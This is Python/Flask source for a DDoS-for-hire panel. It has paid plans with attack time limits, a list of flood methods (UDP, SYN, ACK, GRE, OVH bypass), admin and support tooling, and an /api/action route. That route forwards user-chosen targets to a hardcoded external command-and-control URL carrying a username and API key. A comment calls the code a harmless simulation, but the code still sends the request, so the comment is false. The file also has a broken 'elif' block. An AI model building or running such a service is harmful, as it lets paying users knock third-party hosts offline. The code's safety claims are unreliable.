from flask import Flask, render_template, redirect, url_for, request, flash, abort, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta
from models import db, User, UsageLog
from models import RoleAssignment, Ban, SupportTicket, ChatMessage, AdminChatMessage, BlockedTarget
from functools import wraps
import os
import requests
from sqlalchemy import text
import threading
import time
import socket
from urllib.parse import urlparse

app = Flask(__name__)
app.config['SECRET_KEY'] = '6c076acb28670197db31b487a460b55b'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

CNC_API_URL = "http://dcasdcas.online:8080/api/attack?user=apolo1061&apikey=6c076acb28670197db31b487a460b55b&host={host}&port={port}&time={time}&method={method}"

db.init_app(app)

@app.context_processor
def inject_roles():
    try:
        staff_flag = current_user.is_authenticated and (current_user.is_admin or is_support(current_user))
    except Exception:
        staff_flag = False
    return dict(is_staff=staff_flag)

@app.before_request
def enforce_access_controls():
    p = (request.path or '').rstrip('/').lower()
    orig = (request.headers.get('X-Original-URL') or request.headers.get('X-Rewrite-URL') or '').rstrip('/').lower()
    check_paths = [p, orig]
    for path in check_paths:
        if not path:
            continue
        if path.startswith('/admin'):
            if request.method not in ('GET', 'POST'):
                abort(403)
            if not (current_user.is_authenticated and current_user.is_admin):
                abort(403)
        if path == '/admin_chat':
            if request.method not in ('GET', 'POST'):
                abort(403)
            if not (current_user.is_authenticated and (current_user.is_admin or is_support(current_user))):
                abort(403)
def ensure_support_columns():
    try:
        db.session.execute(text('ALTER TABLE support_ticket ADD COLUMN title VARCHAR(200)'))
    except Exception:
        pass
    try:
        db.session.execute(text('ALTER TABLE support_ticket ADD COLUMN description TEXT'))
    except Exception:
        pass
    db.session.commit()

login_manager = LoginManager()
login_manager.login_view = 'login'
login_manager.init_app(app)

@login_manager.user_loader
def load_user(user_id):
    return db.session.get(User, int(user_id))

# Plan Configurations
PLAN_LIMITS = {
    'free': {'max_time': 30, 'cooldown': 1800, 'allowed_methods': ['udp', 'hex']},
    'user': {'max_time': 300, 'cooldown': 300, 'allowed_methods': '*'},
    'vip': {'max_time': 1200, 'cooldown': 60, 'allowed_methods': '*'},
    'lunar': {'max_time': 3600, 'cooldown': 0, 'allowed_methods': '*'}
}

ATTACK_METHODS = {
    'Layer 4': [
        'udp', 'hex', 'game', 'udpraw', 
        'udpthreads', 'ack', 
        'syn', 'tcpstomp', 'tcpbypass', 'udplegit', 'ovh'
    ],
    'Layer 7': [],
    'Layer 3': ['gre']
}

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated or not current_user.is_admin:
            abort(403)
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        
        if user and check_password_hash(user.password, password):
            login_user(user)
            return redirect(url_for('dashboard'))
        flash('Invalid username or password')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if len(username or '') < 5:
            flash('El usuario debe tener al menos 5 caracteres')
            return redirect(url_for('register'))
        if len(password or '') < 8:
            flash('La contraseña debe tener al menos 8 caracteres')
            return redirect(url_for('register'))
        
        user = User.query.filter_by(username=username).first()
        if user:
            flash('Username already exists')
            return redirect(url_for('register'))
            
        # Check if this is the first user (make them admin)
        is_first_user = User.query.count() == 0
        
        new_user = User(username=username, 
                       password=generate_password_hash(password),
                       plan='free',
                       is_admin=is_first_user) # First user is admin
        
        db.session.add(new_user)
        db.session.commit()
        
        if is_first_user:
            flash('Admin account created!')
        
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/dashboard')
@login_required
def dashboard():
    logs = UsageLog.query.filter_by(user_id=current_user.id).order_by(UsageLog.timestamp.desc()).limit(10).all()
    plan_config = PLAN_LIMITS.get(current_user.plan, PLAN_LIMITS['free'])
    allowed_methods = plan_config.get('allowed_methods', [])
    last_log = UsageLog.query.filter_by(user_id=current_user.id).order_by(UsageLog.timestamp.desc()).first()
    cooldown_remaining = 0
    if last_log:
        elapsed = (datetime.utcnow() - last_log.timestamp).total_seconds()
        if elapsed < plan_config['cooldown']:
            cooldown_remaining = int(plan_config['cooldown'] - elapsed)
    now = datetime.utcnow()
    logs_display = []
    for l in logs:
        elapsed = int((now - l.timestamp).total_seconds())
        remaining = max(l.duration - elapsed, 0)
        status = 'Completed' if remaining == 0 else 'Atacando'
        logs_display.append({
            'timestamp': l.timestamp,
            'target': l.target,
            'duration_total': l.duration,
            'remaining': remaining,
            'status': status
        })
    return render_template('dashboard.html', user=current_user, logs=logs_display, methods=ATTACK_METHODS, allowed_methods=allowed_methods, cooldown_remaining=cooldown_remaining, plan_config=plan_config)

@app.route('/admin')
@login_required
@admin_required
def admin():
    users = User.query.all()
    roles = {r.user_id: r.role for r in RoleAssignment.query.all()}
    bans = {b.user_id: b.active for b in Ban.query.all()}
    return render_template('admin.html', users=users, roles=roles, bans=bans)

@app.route('/admin/update_plan/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def update_plan(user_id):
    new_plan = request.form.get('new_plan')
    user = User.query.get_or_404(user_id)
    if new_plan in PLAN_LIMITS:
        user.plan = new_plan
        db.session.commit()
        flash(f'Updated plan for {user.username} to {new_plan}')
    else:
        flash('Invalid plan selected')
    return redirect(url_for('admin'))

@app.route('/admin/make_admin/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def make_admin(user_id):
    user = User.query.get_or_404(user_id)
    user.is_admin = True
    db.session.commit()
    flash(f'{user.username} is now admin')
    return redirect(url_for('admin'))

@app.route('/admin/revoke_admin/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def revoke_admin(user_id):
    user = User.query.get_or_404(user_id)
    user.is_admin = False
    db.session.commit()
    flash(f'Admin revoked for {user.username}')
    return redirect(url_for('admin'))

@app.route('/admin/make_support/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def make_support(user_id):
    user = User.query.get_or_404(user_id)
    ra = RoleAssignment.query.filter_by(user_id=user.id).first()
    if not ra:
        ra = RoleAssignment(user_id=user.id, role='support')
        db.session.add(ra)
    else:
        ra.role = 'support'
    db.session.commit()
    flash(f'{user.username} is now support')
    return redirect(url_for('admin'))

@app.route('/admin/revoke_support/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def revoke_support(user_id):
    ra = RoleAssignment.query.filter_by(user_id=user_id).first()
    if ra:
        db.session.delete(ra)
        db.session.commit()
    flash('Support revoked')
    return redirect(url_for('admin'))

@app.route('/admin/ban_toggle/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def ban_toggle(user_id):
    b = Ban.query.filter_by(user_id=user_id).first()
    if not b:
        b = Ban(user_id=user_id, active=True)
        db.session.add(b)
    else:
        b.active = not b.active
    db.session.commit()
    flash('Ban status updated')
    return redirect(url_for('admin'))

@app.route('/admin/delete_user/<int:user_id>', methods=['POST'])
@login_required
@admin_required
def delete_user(user_id):
    user = User.query.get_or_404(user_id)
    ChatMessage.query.filter(ChatMessage.sender_id == user.id).delete()
    tickets = SupportTicket.query.filter_by(user_id=user.id).all()
    for t in tickets:
        ChatMessage.query.filter_by(ticket_id=t.id).delete()
        db.session.delete(t)
    RoleAssignment.query.filter_by(user_id=user.id).delete()
    Ban.query.filter_by(user_id=user.id).delete()
    UsageLog.query.filter_by(user_id=user.id).delete()
    db.session.delete(user)
    db.session.commit()
    flash('User deleted')
    return redirect(url_for('admin'))

@app.route('/admin/logs')
@login_required
@admin_required
def admin_logs():
    logs = UsageLog.query.order_by(UsageLog.timestamp.desc()).limit(200).all()
    users = {u.id: u.username for u in User.query.all()}
    return render_template('admin_logs.html', logs=logs, users=users)

@app.route('/admin/blocked')
@login_required
@admin_required
def admin_blocked():
    blocked = BlockedTarget.query.order_by(BlockedTarget.created_at.desc()).all()
    return render_template('admin_blocked.html', blocked=blocked)

@app.route('/admin/blocked/add', methods=['POST'])
@login_required
@admin_required
def admin_block_add():
    host = request.form.get('host', '').strip()
    reason = request.form.get('reason', '').strip()
    if host:
        existing = BlockedTarget.query.filter_by(host=host).first()
        if not existing:
            db.session.add(BlockedTarget(host=host, reason=reason))
            db.session.commit()
            flash('Target bloqueado')
        else:
            flash('Ese target ya está bloqueado')
    else:
        flash('Ingresa un host válido')
    return redirect(url_for('admin_blocked'))

@app.route('/admin/blocked/remove/<int:block_id>', methods=['POST'])
@login_required
@admin_required
def admin_block_remove(block_id):
    bt = BlockedTarget.query.get_or_404(block_id)
    db.session.delete(bt)
    db.session.commit()
    flash('Target desbloqueado')
    return redirect(url_for('admin_blocked'))

@app.errorhandler(403)
def forbidden(e):
    return render_template('403.html'), 403

@app.errorhandler(404)
def not_found(e):
    return render_template('404.html'), 404
@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/api/action', methods=['GET'])
@login_required
def action():
    host = request.args.get('host')
    port = request.args.get('port')
    time_raw = request.args.get('time')
    try:
        time = int(str(time_raw).strip())
    except Exception:
        flash('Tiempo inválido')
        return redirect(url_for('dashboard'))
    method = request.args.get('method')
    threads = request.args.get('threads')
    
    plan_config = PLAN_LIMITS.get(current_user.plan, PLAN_LIMITS['free'])
    check_target = host
    if method == 'http' and host:
        parsed = urlparse(host if '://' in host else f'http://{host}')
        check_target = parsed.hostname or host.strip('/ ')
    else:
        if host and '://' in host:
            parsed2 = urlparse(host)
            if parsed2.hostname:
                check_target = parsed2.hostname
    bt = BlockedTarget.query.filter_by(host=check_target).first()
    if bt:
        flash(f'Target bloqueado por administración: {bt.host} — {bt.reason}')
        return redirect(url_for('dashboard'))
    if plan_config['allowed_methods'] != '*' and method not in plan_config['allowed_methods']:
        flash(f'Error: Method {method} is not available on your plan (Upgrade to use).')
        return redirect(url_for('dashboard'))
    b = Ban.query.filter_by(user_id=current_user.id, active=True).first()
    if b:
        flash('Your account is banned.')
        return redirect(url_for('dashboard'))
    
    # Check Max Time
    if time > plan_config['max_time']:
        flash(f'Error: Your plan allows max {plan_config["max_time"]} seconds.')
        return redirect(url_for('dashboard'))
    if time < 1:
        flash('Tiempo inválido')
        return redirect(url_for('dashboard'))
        
    # Check Cooldown
    last_log = UsageLog.query.filter_by(user_id=current_user.id).order_by(UsageLog.timestamp.desc()).first()
    if last_log:
        elapsed = (datetime.utcnow() - last_log.timestamp).total_seconds()
        if elapsed < plan_config['cooldown']:
            remaining = int(plan_config['cooldown'] - elapsed)
            flash(f'Cooldown active. Please wait {remaining} seconds.')
            return redirect(url_for('dashboard'))
    active_same_target = False
    target_logs = UsageLog.query.filter_by(target=check_target).order_by(UsageLog.timestamp.desc()).all()
    now_check = datetime.utcnow()
    for tl in target_logs:
        elapsed_t = (now_check - tl.timestamp).total_seconds()
        if elapsed_t < tl.duration:
            active_same_target = True
            break
    if active_same_target:
        flash('Este objetivo ya está siendo usado globalmente. Intenta más tarde.')
        return redirect(url_for('dashboard'))

    # SIMULATION: Log the action but DO NOT execute any attack
    # Here you would typically call an external API if this were a legitimate tool.
    # For educational purposes, we just log it.
    
    try:
        if method == 'http':
            parsed = urlparse(host if '://' in host else f'http://{host}')
            domain = parsed.hostname or host.strip('/ ')
            try:
                host_ip = socket.gethostbyname(domain)
            except Exception:
                flash('No se pudo resolver el dominio a IP')
                return redirect(url_for('dashboard'))
            final_port = 80
            api_url = CNC_API_URL.format(host=host_ip, port=final_port, time=time, method='http') + f"&domain={domain}&conns=200"
        elif method == 'udpthreads':
            tval = 1
            try:
                if threads is not None:
                    tval = int(threads)
            except Exception:
                tval = 1
            if tval < 1:
                tval = 1
            if tval > 4:
                tval = 4
            api_url = CNC_API_URL.format(host=host, port=port, time=time, method='udpthreads') + f"&size=1400&threads={tval}"
        else:
            if not port:
                flash('Puerto inválido')
                return redirect(url_for('dashboard'))
            try:
                pval = int(str(port).strip())
            except Exception:
                flash('Puerto inválido')
                return redirect(url_for('dashboard'))
            if pval < 1 or pval > 65535:
                flash('Puerto inválido')
                return redirect(url_for('dashboard'))
            if check_target:
                try:
                    socket.gethostbyname(check_target)
                except Exception:
                    flash('Host inválido')
                    return redirect(url_for('dashboard'))
            api_url = CNC_API_URL.format(host=host, port=pval, time=time, method=method)
        requests.get(api_url, timeout=5)
    except Exception as e:
        print(f"API Error: {e}")

    new_log = UsageLog(user_id=current_user.id, duration=time, target=check_target)
    db.session.add(new_log)
    db.session.commit()
    
    flash(f'Tarea iniciada para {check_target}:{final_port} durante {time}s. Método {method.upper()}')
    elif method == 'udpthreads':
        flash(f'Tarea iniciada para {host}:{port} durante {time}s. Método UDPTHREADS')
    else:
        flash(f'Tarea iniciada para {host}:{port} durante {time}s. Estado: Atacando')
    return redirect(url_for('dashboard'))

def is_support(user):
    ra = RoleAssignment.query.filter_by(user_id=user.id).first()
    return ra and ra.role == 'support'

@app.route('/support')
@login_required
def support_home():
    staff = current_user.is_admin or is_support(current_user)
    if staff:
        tickets = SupportTicket.query.order_by(SupportTicket.created_at.desc()).all()
    else:
        tickets = SupportTicket.query.filter_by(user_id=current_user.id).order_by(SupportTicket.created_at.desc()).all()
    return render_template('support.html', tickets=tickets, can_open=(not staff))

@app.route('/support/new', methods=['POST'])
@login_required
def support_new():
    title = request.form.get('title', '').strip()
    description = request.form.get('description', '').strip()
    if not title or not description:
        flash('Por favor, proporciona título y descripción del problema')
        return redirect(url_for('support_home'))
    t = SupportTicket(user_id=current_user.id, title=title, description=description, status='open')
    db.session.add(t)
    db.session.commit()
    return redirect(url_for('support_ticket', ticket_id=t.id))

@app.route('/support/ticket/<int:ticket_id>')
@login_required
def support_ticket(ticket_id):
    t = SupportTicket.query.get_or_404(ticket_id)
    if not (current_user.is_admin or is_support(current_user) or t.user_id == current_user.id):
        abort(403)
    msgs = ChatMessage.query.filter_by(ticket_id=t.id).order_by(ChatMessage.created_at.asc()).all()
    return render_template('chat_ticket.html', ticket=t, messages=msgs)

@app.route('/terms')
def terms():
    return render_template('terms.html')

@app.route('/support/ticket/<int:ticket_id>/send', methods=['POST'])
@login_required
def support_send(ticket_id):
    t = SupportTicket.query.get_or_404(ticket_id)
    if not (current_user.is_admin or is_support(current_user) or t.user_id == current_user.id):
        abort(403)
    msg = request.form.get('message', '').strip()
    if msg:
        cm = ChatMessage(ticket_id=t.id, sender_id=current_user.id, message=msg)
        db.session.add(cm)
        db.session.commit()
    return redirect(url_for('support_ticket', ticket_id=t.id))

@app.route('/support/ticket/<int:ticket_id>/close', methods=['POST'])
@login_required
def support_close(ticket_id):
    t = SupportTicket.query.get_or_404(ticket_id)
    if not (current_user.is_admin or is_support(current_user) or t.user_id == current_user.id):
        abort(403)
    t.status = 'closed'
    db.session.commit()
    flash('Ticket cerrado')
    return redirect(url_for('support_ticket', ticket_id=t.id))

@app.route('/admin_chat')
@login_required
def admin_chat():
    if not (current_user.is_admin or is_support(current_user)):
        abort(403)
    msgs = AdminChatMessage.query.order_by(AdminChatMessage.created_at.asc()).limit(500).all()
    return render_template('admin_chat.html', messages=msgs)

@app.route('/admin_chat/send', methods=['POST'])
@login_required
def admin_chat_send():
    if not (current_user.is_admin or is_support(current_user)):
        abort(403)
    msg = request.form.get('message', '').strip()
    if msg:
        db.session.add(AdminChatMessage(sender_id=current_user.id, message=msg))
        db.session.commit()
    return redirect(url_for('admin_chat'))

@app.route('/admin_chat/messages')
@login_required
def admin_chat_messages():
    if not (current_user.is_admin or is_support(current_user)):
        abort(403)
    since_id = int(request.args.get('since_id', 0))
    q = AdminChatMessage.query
    if since_id > 0:
        q = q.filter(AdminChatMessage.id > since_id)
    msgs = q.order_by(AdminChatMessage.created_at.asc()).limit(500).all()
    payload = []
    for m in msgs:
        payload.append({
            'id': m.id,
            'sender_id': m.sender_id,
            'message': m.message,
            'created_at': m.created_at.strftime('%Y-%m-%d %H:%M')
        })
    return jsonify(payload)
if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        ensure_support_columns()
    def _admin_chat_purger():
        while True:
            with app.app_context():
                cutoff = datetime.utcnow() - timedelta(hours=5)
                AdminChatMessage.query.filter(AdminChatMessage.created_at < cutoff).delete()
                db.session.commit()
            time.sleep(300)
    threading.Thread(target=_admin_chat_purger, daemon=True).start()
    app.run(host='0.0.0.0', port=8880, debug=False)
